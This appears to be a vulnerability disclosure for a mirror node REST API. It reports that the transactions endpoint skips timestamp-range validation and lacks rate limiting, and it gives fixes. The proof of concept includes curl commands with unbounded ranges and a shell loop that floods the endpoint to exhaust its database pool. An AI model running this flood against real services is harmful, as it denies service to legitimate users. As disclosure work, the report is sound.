### Title
Unbounded Timestamp Range Accepted by `getTransactions()` Due to `validateRange=false`, Combined with `bindTimestampRange` Defaulting to Off and No REST API Rate Limiting

### Summary
`getTransactions()` in `rest/transactions.js` calls `parseTimestampFilters` with `validateRange=false`, which unconditionally bypasses the configured 7-day `maxTimestampRange` enforcement. The secondary protection, `bindTimestampRange`, defaults to `false` in production and is therefore also inactive. With no rate limiting on the REST API, any unauthenticated caller can flood the endpoint with requests carrying arbitrarily large (or fully open) timestamp ranges, forcing repeated wide index-range scans and multi-table FULL OUTER JOINs against the transaction table, degrading DB performance for all users.

### Finding Description

**Exact code path:**

`getTransactions()` — `rest/transactions.js` line 671–677: [1](#0-0) 

The call at line 674 is:
```js
const timestampRange = utils.parseTimestampFilters(timestampFilters, false, true, true, false, false);
//                                                  filterRequired  allowNe  allowOpenRange  strictCheckOverride  validateRange
```
The sixth argument `validateRange = false` is the root cause.

**Range validation gate in `parseTimestampFilters`** — `rest/utils.js` lines 1657–1665: [2](#0-1) 

The entire block that enforces `maxTimestampRangeNs` (7 days) is wrapped in `if (validateRange)`. Because `getTransactions()` passes `false`, this block is never entered, and any range — including one spanning years or the entire chain history — passes validation silently.

**Secondary protection also inactive by default** — `rest/timestampRange.js` lines 19–22: [3](#0-2) 

`bindTimestampRange` returns `{range}` unchanged when `queryConfig.bindTimestampRange` is falsy. Per documentation, the default is `false`: [4](#0-3) 

**No rate limiting on the REST API.** The throttle infrastructure (`ThrottleConfiguration`, `ThrottleManagerImpl`) is scoped exclusively to the `web3` module (contract calls). There is no equivalent middleware protecting `GET /api/v1/transactions`.

**Expensive query path triggered.** When an account filter is also supplied (e.g., `?account.id=0.0.X&timestamp=gte:0`), `getTransactionTimestampsQuery` builds a query with FULL OUTER JOINs across `transaction`, `crypto_transfer`, `token_transfer`, and `entity_transaction`: [5](#0-4) 

Even with `LIMIT 100`, PostgreSQL must evaluate the join conditions across the full unbounded timestamp range before it can return the first page, making each such request significantly more expensive than a simple indexed seek.

### Impact Explanation

An unauthenticated attacker can issue a continuous stream of requests such as:
```
GET /api/v1/transactions?account.id=0.0.2&timestamp=gte:0&timestamp=lte:9999999999999999999
```
Each request causes the DB to execute wide-range scans and FULL OUTER JOINs. The DB connection pool is capped at 10 connections (`maxConnections: 10`) and the statement timeout is 20 seconds (`statementTimeout: 20000`). A modest flood of concurrent requests saturates the pool and keeps all 10 connections busy with expensive queries for up to 20 seconds each, starving legitimate users of DB access and causing elevated CPU load and degraded response times across all endpoints sharing the same DB.

### Likelihood Explanation

No authentication, API key, or IP-based rate limit is required. The endpoint is publicly reachable. The exploit requires only a standard HTTP client and knowledge of any valid account ID (which is public on-chain data). It is trivially repeatable and scriptable. The only natural brake is the 20-second statement timeout, which still allows an attacker to maintain sustained pressure with a small number of concurrent connections.

### Recommendation

1. **Pass `validateRange=true`** in the `parseTimestampFilters` call inside `getTransactions()` (line 674 of `rest/transactions.js`). This enforces the existing `maxTimestampRange` (7d) check for closed ranges without breaking open-range pagination.
2. **Enable `bindTimestampRange: true` by default** (or at minimum document it as a required production hardening step), so that even open-range requests are capped server-side to `maxTransactionsTimestampRangeNs`.
3. **Add per-IP or per-client rate limiting** to the Node.js REST API layer (e.g., via an express-rate-limit middleware or an ingress-level policy) analogous to the throttle already present in the web3 module.

### Proof of Concept

**Preconditions:** Public network access to the mirror node REST API. No credentials needed.

**Step 1 — Confirm bypass (single request):**
```bash
curl -s "https://<mirror-node>/api/v1/transactions?timestamp=gte:0&timestamp=lte:9999999999999999&limit=100"
# Returns HTTP 200 — no 400 "Timestamp range ... within 7d" error
```

**Step 2 — Confirm expensive path (account filter + unbounded range):**
```bash
curl -s "https://<mirror-node>/api/v1/transactions?account.id=0.0.2&timestamp=gte:0&timestamp=lte=9999999999999999&limit=100"
# Triggers FULL OUTER JOIN path across transaction/crypto_transfer/token_transfer
```

**Step 3 — Sustained load (flood with concurrent requests):**
```bash
for i in $(seq 1 50); do
  curl -s "https://<mirror-node>/api/v1/transactions?account.id=0.0.2&timestamp=gte:0&timestamp=lte:9999999999999999&limit=100" &
done
wait
```
With a DB pool of 10 and a 20-second statement timeout, this saturates all available connections, causing other API endpoints to queue or time out.
